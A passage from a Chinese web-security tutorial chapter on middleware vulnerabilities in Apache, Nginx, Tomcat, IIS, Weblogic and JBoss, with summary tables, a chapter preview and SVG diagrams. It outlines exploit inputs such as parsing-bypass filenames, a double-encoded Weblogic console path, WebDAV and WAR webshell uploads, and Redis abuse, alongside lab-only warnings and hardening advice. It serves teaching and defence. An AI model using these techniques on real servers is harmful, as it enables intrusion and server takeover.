安全这一行，知识更新特别快，新漏洞层出不穷。没事的时候可以刷刷CVE公告，了解一下最新的漏洞。

推荐几个网站：
- CVE官网
- CNVD（国家信息安全漏洞共享平台）
- CNNVD（国家信息安全漏洞库）
- 各大安全厂商的公众号、博客

不用每个漏洞都深入研究，至少知道有这么个东西、大概是干嘛的就行。

### 4. 多动手复现 🛠️

安全是一门实践性很强的学科，光看书看视频是没用的，一定要动手！

有句话说得好："纸上得来终觉浅，绝知此事要躬行。" 你看十遍教程，不如自己亲手复现一遍记得牢。

Vulhub上面有那么多环境，没事就拿来练手，一个个复现过去，你的水平会提升得很快。

### 5. 搭建自己的靶场环境 🏗️

最好自己搭一套完整的靶场环境，比如：
- 装个Windows Server，跑IIS
- 装个Linux，跑Apache/Nginx/Tomcat
- 装个Redis、MySQL啥的

然后自己在上面做实验，尝试攻击，再尝试加固。这样你对中间件的理解会更深刻。

---

## 本章总结 📝

好了，这一章的内容就到这儿了，信息量超大！我们来全面总结一下六大中间件+组件全家桶：

**1. 什么是中间件？**
- 中间件就是运行网站的服务器软件，是网站代码和硬件之间的"中间人"
- **六大主流**：Apache🌐 / Nginx⚡ / Tomcat🐱 / IIS🪟 / Weblogic🟧 / JBoss🟥
- 中间件漏洞属于"地基级"漏洞，一破全破，危害极大！

**2. 轻量级三兄弟（Apache / Nginx / Tomcat）**
| 中间件 | 经典漏洞 | 关键利用点 |
|-------|---------|-----------|
| Apache | 解析漏洞 | `shell.php.jpg` → 从右往左匹配后缀 |
| Nginx | 解析漏洞+目录穿越 | `shell.jpg/.php` + cgi.fix_pathinfo |
| Tomcat | 弱口令+WAR部署+Ghostcat | `/manager/html` 传WAR包getshell |

**3. 企业级三巨头（IIS / Weblogic / JBoss）—— 护网红队最爱！** 🚩

| 中间件 | 经典漏洞 | 端口 | 实战价值 |
|-------|---------|------|---------|
| **IIS** | ① IIS6.0解析漏洞 `shell.asp;.jpg`<br>② 短文件名泄露（8.3规则 ~1*1枚举）<br>③ PUT/WebDAV上传 | 80/443 | ⭐⭐⭐⭐⭐ 政府/国企标配，信息收集神器 |
| **Weblogic** | ① CVE-2019-2725 反序列化RCE<br>② CVE-2020-14882 未授权console RCE<br>③ 多个T3协议反序列化 | **7001** | ⭐⭐⭐⭐⭐ 金融/央企标配，一打一个准！ |
| **JBoss** | ① `/jmx-console/` 未授权+WAR部署<br>② `/invoker/JMXInvokerServlet` 反序列化 | 8080/9990 | ⭐⭐⭐⭐ 中大型企业常见，利用简单 |

**4. 其他组件漏洞**
- Redis未授权访问：写webshell、写SSH公钥、写计划任务 → 直拿服务器
- MongoDB未授权访问：数据泄露（拖库）
- MySQL弱口令：拖库、UDF提权、MOF提权

**5. 防御措施总览**🛡️
| 防御手段 | 解决的问题 |
|---------|-----------|
| 及时升级版本 | 已知CVE漏洞 |
| 安全配置（cgi.fix_pathinfo=0等）| 解析/配置类漏洞 |
| 关闭/限制后台（console/manager） | 弱口令+WAR部署 |
| 强口令策略（不使用tomcat/tomcat）| 弱口令爆破 |
| 限IP访问（Redis/后台只允许内网）| 未授权访问 |
| WAF防护 | 扫描/常规攻击 |

怎么样？六大中间件全家桶是不是干货满满？这些漏洞就是护网行动、红队项目里最常遇到的"突破口"！掌握它们，你就有了实战中能打的第一个武器库！💪

---

## 下章预告 🎬

小伙伴们注意了——**我们的靶场之旅还没结束！** 🎉

为了让大家从"会打单个漏洞"进化到"精通实战组合拳"，后面我们还有超重量级的 **Day40 ~ Day45 高级专题篇**：

| 章节 | 内容预告 | 为什么要学？ |
|-----|---------|------------|
| **Day39** | DC-1靶机实战（综合渗透） | 把Day1~Day38所有知识串起来，打一场完整的靶机 |
| **Day40** | Fastjson全版本漏洞深度精讲 | 实战Top3 Java漏洞，autotype bypass + JNDI链大全 |
| **Day41** | Shiro反序列化完全攻略 | rememberMe机制 + AES密钥爆破 + Padding Oracle |
| **Day42** | Log4j2 核弹级漏洞深挖 | JNDI全利用链 + JDK版本绕过 + WAF绕过大全 |
| **Day43** | Weblogic全漏洞链完整攻略 | T3/IIOP协议 + 6个反序列化CVE一条龙 |
| **Day44** | 综合靶场实战方法论 | Vulhub组合拳 + 信息收集→探测→组合利用→提权→横向 |
| **Day45** | 毕业总结 + 就业/CTF路线图 | Web安全全景图 + 红队/蓝队/安全研究方向选择 |

先别急着毕业，**Day39我们先来一场真刀真枪的DC-1靶机实战**，检验一下大家前面38天的学习成果！打完这场，再跟我们进入Day40~Day45的"大师班"深度课程吧！

DC-1靶机综合实战，我们不见不散！🔥

---

> 💡 **小提示**：
> 1. 中间件漏洞的关键在于"配置不当"，很多时候不是软件有问题，而是人没配置好
> 2. 复现漏洞的时候一定要用Vulhub这种靶场环境，不要去搞真实的网站，违法的！
> 3. 安全是一把双刃剑，学好了是用来保护人的，不是用来搞破坏的

---

# 🖼️ 本章拓展图解汇总（day-38 · 共20张SVG架构图）


<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gka8ipapf" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gka8ipapf)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🏛️ 六大中间件漏洞全景</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Apache 老牌Web</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nginx 高并发Web</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Tomcat Servlet容器</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IIS Windows Web</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Weblogic 企业JavaEE</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JBoss/WildFly 应用服</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="ggbkllzg4" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#ggbkllzg4)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧊 Apache 解析漏洞家族</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">AddHandler .php 配置错</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">双后缀 .php.jpg 误解析</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2017-15715 %0a截断</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">重写规则绕过</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Apache 2.2 vs 2.4差异</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gapdz9ilf" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gapdz9ilf)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f766e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🌊 Nginx 解析+目录穿越</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">path_info .php/文件解析</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">alias ../ 目录穿越 CVE</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2013-4547 空格截断</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">fastcgi_split漏洞</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CRLF注入响应拆分</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gyfmpypj4" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gyfmpypj4)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0b5394" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🐈 Tomcat 利用矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PUT上传 CVE-2017-12615</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">弱口令 manager + WAR部署</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">AJP Ghostcat CVE-2020-1938</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">/examples 样例泄露</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Host Manager 弱口令</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gporwdpuk" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gporwdpuk)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#164e63" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🪟 IIS 经典解析漏洞</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IIS 6 /xx.asp/ 目录解析</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">.asp;.jpg 分号截断</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IIS 7.x %00 截断</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">短文件名 ~1 枚举</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">WebDAV PUT 写马</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g1v4kkzyx" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g1v4kkzyx)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔒 IIS 短文件名探测原理</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">OPTIONS *~1*/. HTTP</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">404 vs 400 状态差异</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">逐字符二分法枚举</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">0-9a-zA-Z长度穷举</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">.aspx/.asp 后缀猜测</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gf1qlu6tw" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gf1qlu6tw)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🪤 IIS WebDAV PUT 攻击</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">OPTIONS确认方法支持</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PROPFIND列目录权限</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PUT上传 shell.txt</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">MOVE / COPY 重命名.asp</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">菜刀/蚁剑连接马</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g2bjytrrs" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g2bjytrrs)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7f1d1d" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🏰 Weblogic 端口与指纹</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">7001 HTTP 默认</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">7002 HTTPS t3s</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">5556 NodeManager</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">7003 Managed</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">8453 远程调试</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">9002 Coherence</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gz41mzquz" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gz41mzquz)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">💣 Weblogic 四大经典RCE</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2019-2725 XMLDecoder</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2020-14882 Console未授权</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2020-2555 T3反序列化</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2021-2109 JNDI注入</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g1jautarw" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g1jautarw)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b91c1c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📡 CVE-2019-2725流程</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">/_async/AsyncResponseService</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SOAP Body XMLDecoder</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Class Runtime ProcessBuilder</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">exec("calc") 命令执行</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">无需登录 直接回显RCE</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gkxct2yuk" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gkxct2yuk)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🚪 CVE-2020-14882未授权</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">/console/css/%252e%252e%252fconsole.portal</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">双重URL编码 ../绕过</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">_nfpb=true&amp;_pageLabel</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加载后台页面</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">未授权执行任意命令</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="ggv980y2f" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#ggv980y2f)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#155e75" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🐂 JBoss 三大利用面</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JMX Console 未授权</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">jmx-console/HtmlAdaptor</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">部署WAR包拿Shell</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">反序列化 JMXInvokerServlet</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">EJBInvokerServlet 反序列</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gv4hiw9dz" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gv4hiw9dz)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📦 JBoss WAR部署攻击</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JMX-console 未授权访问</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">jboss.web:service=Deployer</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">addURL() 加载远程WAR</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JBoss自动解压部署WAR</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">访问 /war/shell.jsp 执行</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gmenl5i8y" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gmenl5i8y)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛡️ 加固基线12项</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">最新安全补丁 PSU</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">隐藏版本号Banner</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">禁用未用模块/端点</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">低权限非root启动</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">日志审计+WAF+RASP</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Web目录只读权限</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g0lahdkbb" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g0lahdkbb)"/>
